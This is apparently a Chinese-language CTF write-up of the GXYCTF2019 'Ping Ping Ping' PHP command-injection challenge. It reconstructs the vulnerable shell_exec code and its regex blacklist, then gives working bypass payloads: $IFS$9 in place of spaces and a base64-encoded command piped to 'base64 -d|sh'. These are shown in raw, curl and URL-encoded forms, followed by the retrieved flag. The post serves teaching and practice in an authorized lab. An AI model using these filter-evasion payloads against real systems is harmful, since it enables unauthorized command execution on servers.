---
title: "[GXYCTF2019] Ping Ping Ping：空格与关键字的双重过滤"
date: 2026-10-25 10:23:00
updated: 2026-10-28 20:30:00
categories:
  - CTF
  - Web
  - 命令注入
tags:
  - 命令注入
  - 命令执行
  - 空格绕过
  - base64 编码
  - GXYCTF
description: 一道 ping 命令注入题：先用回显报错反推后端正则，再用 $IFS$9 解决空格，最后把整条命令 base64 编码塞进去读 flag。
difficulty: 入门
topic: 命令注入
series: 命令注入
series_order: 1
permalink: 2026/10/25/web-ctf-command-injection-pingping/
---


## 观察题目

打开靶机，首页只有一行：

```text
/?ip=
```

响应头里能看到 `X-Powered-By: PHP/5.6.40`，说明是 PHP 后端。这行 `/?ip=` 相当于出题人把参数名直接写在脸上了。

带上参数请求：

```http
GET /?ip=127.0.0.1 HTTP/1.1
```

返回：

```text
<pre>PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.036 ms
...
--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
```

`-c 4`、busybox 风格的输出，基本可以确定后端执行的是 `ping -c 4 $ip`。

## 确认命令注入

追加一条 `ls`：

```http
GET /?ip=127.0.0.1;ls HTTP/1.1
```

ping 的输出后面多出了目录列表：

```text
flag.php
index.php
```

注入成立，而且目标文件就在眼前。

{% note success %}
到这里先别急着读文件。**先摸清过滤规则**，否则每换一个 payload 都要重新猜为什么失败。
{% endnote %}

## 用报错信息反推过滤规则

这一步不要盲试。每发一个“问题输入”，观察报错，就能一点点把黑名单拼出来。

| 测试 payload | 返回 | 推论 |
| --- | --- | --- |
| `127.0.0.1;cat flag.php` | `fxck your space!` | 空格被过滤 |
| `127.0.0.1;ls /` | `1fxck your symbol!` | `/` 被过滤；前面那个 `1` 是 `preg_match` 返回的匹配结果 |
| `127.0.0.1;echo flag` | `fxck your space!` | 同时命中两条规则时，先报空格 |
| `127.0.0.1;echo$IFS$9flag` | `fxck your flag!` | `flag` 关键字被正则拦截 |

{% note warning %}
注意第三行：同一个请求里既有空格又有 `flag`，返回的却是空格错误。说明**检查是有先后顺序的**，这能帮我们还原出源码结构。
{% endnote %}

## 还原后端源码

根据行为，这题和 GXYCTF2019 原题的公开源码一致，大致是：

```php
<?php
if (isset($_GET['ip'])) {
    $ip = $_GET['ip'];

    // 1. 危险符号、控制字符
    if (preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)) {
        echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|/", $ip, $match);
        die("fxck your symbol!");
    }
    // 2. 空格
    else if (preg_match("/ /", $ip)) {
        die("fxck your space!");
    }
    // 3. bash
    else if (preg_match("/bash/", $ip)) {
        die("fxck your bash!");
    }
    // 4. flag（按顺序出现 f、l、a、g 就拦截）
    else if (preg_match("/.*f.*l.*a.*g.*/", $ip)) {
        die("fxck your flag!");
    }

    $a = shell_exec("ping -c 4 " . $ip);
    echo "<pre>";
    print_r($a);
}
```

过滤清单可以总结成一张表：

| 类别 | 被过滤的内容 |
| --- | --- |
| 符号 | `&` `/` `?` `*` `<` `>` `'` `"` `\` `(` `)` `[` `]` `{` `}` 加控制字符 |
| 空格 | 普通空格 |
| 关键字 | `bash`、`flag` |
| 正则特点 | `flag` 不要求连续，f、l、a、g **按顺序**出现就命中 |

{% note danger %}
第 4 条最阴：`.*f.*l.*a.*g.*` 不要求 `flag` 连续，只要 f、l、a、g **按顺序**出现就算命中。这一点直接决定了后面很多“聪明写法”会失败。
{% endnote %}

## 逐个试绕过

先明确目标命令是 `cat flag.php`，然后分别解决“空格”和“flag”两关。

| 尝试 | 结果 |
| --- | --- |
| `cat$IFS$9flag.php` | {% label danger@失败 %} 原始串里就有 `flag`，中招 |
| `cat$IFS$9fla?.php` | {% label danger@失败 %} `?` 在黑名单 |
| `cat$IFS$9fla*g.php` | {% label danger@失败 %} `*` 在黑名单 |
| `cat$IFS$9fla\g.php` | {% label danger@失败 %} `\` 在黑名单 |
| `cat$IFS$9${...}` | {% label danger@失败 %} `{ }` 在黑名单 |
| `a=f;b=lag;cat$IFS$9$a$b.php` | {% label danger@失败 %} `a=f;b=lag` 里按顺序出现 f、l、a、g，依然命中正则 |
| ``cat$IFS$9`ls` `` | {% label warning@思路可用 %} 会把目录下所有文件都打印出来（见「拿到 flag」） |

到这里结论很清楚了：**逐个字符做文章，绕不过顺序敏感的正则。** 换一个维度——**不传明文，传编码。**

## 最终 payload：base64 整条命令

把要执行的命令整体编码：

```sh
$ printf 'cat flag.php' | base64
Y2F0IGZsYWcucGhw
```

得到 `Y2F0IGZsYWcucGhw`。检查一下：里面没有空格，没有黑名单符号，也没有按顺序出现的 f、l、a、g，所有检查都能过。

再拼一条“解码并执行”的链路：

```text
echo <b64>  ──►  base64 -d  ──►  sh
输出密文          解码成命令         执行命令
```

| 组件 | 作用 |
| --- | --- |
| `echo Y2F0...` | 输出密文 |
| `base64 -d` | 解码回 `cat flag.php` |
| `\| sh` | 让 shell 从标准输入读取并执行这条命令 |

把空格换成 `$IFS$9`，接在 ping 后面：

```text
?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
```

服务器实际执行的命令是：

```sh
ping -c 4 127.0.0.1; echo Y2F0IGZsYWcucGhw | base64 -d | sh
```

{% note warning %}
注意 `echo$IFS$9Y2F0...` 里 `$9` 的作用：如果没有 `$9`，shell 会把 `$IFSY2F0IGZsYWcucGhw` 整个当成变量名，展开成空，密文就丢了。
{% endnote %}

用 curl 发请求（URL 用**单引号**包住，否则本地的 shell 会先把 `$IFS` 展开成空）：

```bash
curl 'http://target/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh'
```

如果 URL 需要显式编码，`;` 写成 `%3B`，`$` 写成 `%24`，`|` 写成 `%7C`：

```text
?ip=127.0.0.1%3Becho%24IFS%249Y2F0IGZsYWcucGhw%7Cbase64%24IFS%249-d%7Csh
```

## 拿到 flag

返回结果里，ping 的输出后面跟着 `flag.php` 的源码：

```php
<?php
$flag = "CTF2{f7f9783e-54fa-4b75-a358-57b5b95b1e6f}";
?>
```

完整 flag：

```text
CTF2{f7f9783e-54fa-4b75-a358-57b5b95b1e6f}
```

> 注：不同平台复刻这道题时，flag 内容会不一样，以自己靶场里读到的为准。

{% note info %}
**延伸思路（未在本题实测）**

本题只禁了 `bash`，没禁反引号。理论上可以写：

```text
?ip=127.0.0.1;cat$IFS$9`ls`
```

`ls` 的输出是 `flag.php` 和 `index.php` 两行，命令替换后会被拆成两个参数，等价于 `cat flag.php index.php`。这样请求里完全不出现 `flag`。缺点是会把 `index.php` 也打印出来，输出更长；而且是否按行拆分取决于 shell 的 IFS 行为，换了环境未必成立。相比之下，base64 方案更稳定、更通用。
{% endnote %}

## 总结

这道题虽然只有一关 ping，但把命令注入的完整套路都串了一遍：

- **注入点**：参数被拼进 `shell_exec("ping -c 4 " . $ip)`；
- **入口**：`;` 不在黑名单，一句话就能执行任意命令；
- **第一关空格**：`$IFS` 是 shell 自带的“空格别名”，`$9` 用来切断变量名；
- **第二关关键字**：顺序敏感的正则让字母拆分失效，base64 把整条命令编码，从“字符层面”跳出过滤；
- **执行链**：`echo <b64> | base64 -d | sh` 是绕过关键字过滤的经典组合拳。

> 通用套路可以记成一句话：
>
> **找注入点 → 确认分隔符 → 摸黑名单 → 找等价写法 → 编码兜底**

最后再强调一遍：这些技巧只适合在授权靶场里练习。真实项目里，防住它的办法只有一个——**别让用户输入进入 shell。**
